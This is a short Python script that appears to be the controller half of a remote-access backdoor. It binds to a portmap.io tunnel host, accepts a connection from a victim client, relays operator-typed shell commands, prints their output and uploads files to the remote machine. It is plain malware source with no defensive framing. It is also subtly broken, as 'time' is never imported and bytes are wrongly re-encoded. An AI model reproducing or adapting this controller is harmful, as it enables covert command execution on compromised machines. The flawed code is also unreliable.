import os
import socket

class Sender:
	def __init__(self):
		self.host= "pramoth-41592.portmap.io"
		self.port = 60067

	def Control(self):
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.bind((self.host,self.port))
			print(" [ + ] Binding Port And Host ")
			s.listen()
			cli_socket , addr = s.accept()
			time.sleep(3)
			while True:
				Send = input("Prompt  >")
				if not Send.strip():
					continue
				cli_socket.send(Send.encode())
				Lst = Send.split()
				if Lst[0].strip().lower()=="send":
					time.sleep(1)
					with open(Lst[1].strip(),'rb') as File:
						d = File.read(1024)
						while d:
							cli_socket.sendall(d.encode())
							d = File.read(1024)
						File.close()
					print(Lst[1],"SEND SuccessFull !")
				elif Lst[0].strip().lower()=="cd":
					print("Changed [ + ]",cli_socket.recv(1024).decode())
				else:
					print(cli_socket.recv(1024).decode())
		except:
			cli_socket.close()
			s.close()
			self.Control()
s = Sender()
s.Control()